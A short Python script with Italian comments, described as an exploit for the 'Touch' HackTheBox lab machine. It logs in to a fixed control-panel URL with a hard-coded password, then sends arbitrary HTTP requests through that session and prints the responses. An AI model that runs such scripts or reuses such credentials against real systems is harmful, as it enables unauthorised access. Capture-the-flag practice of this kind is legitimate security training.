import requests
import argparse

def main():
    parser=argparse.ArgumentParser(description="Exploit per la macchina Touch HTB")

    parser.add_argument("-u","--url",required=True,help="url target")
    parser.add_argument("-p","--port",default=80,help="porta target")
    parser.add_argument("-x","--method",default='GET',help="metodo http")
    parser.add_argument("-e","--endpoint",default='/',help="endpoint target")

    argomenti=parser.parse_args()

    url=argomenti.url
    porta=argomenti.port
    metodo=argomenti.method.upper()
    endpoint=argomenti.endpoint

    # password di accesso al pannello di controllo
    autorizzazione={
        "password":"NX-DH-2024-B7042"
    }

    # url completo
    target=f"{url}:{porta}{endpoint}"

    # url FISSO per il login di "Session()"
    login="http://touch.htb:8443/login"

    try:
        print("[+] invio richiesta...")
        # creazione della sessione
        sessione=requests.Session()
        # esecuzione del login
        sessione.post(url=login,data=autorizzazione)
        # richiesta arbitaria
        richiesta=sessione.request(method=metodo,url=target,timeout=20)
        # controlli sullo status code
        if richiesta.status_code==200:
            print("[+] richiesta accettata")
            print(f"[+] codice risposta: {richiesta.status_code}")
            print(richiesta.text)
        else:
            print("[!] errore richiesta")
            print(f"[+] codice risposta: {richiesta.status_code}")
            print(richiesta.text)
    except:
        print("ERRORE EXPLOIT")

if __name__=='__main__':
    main()
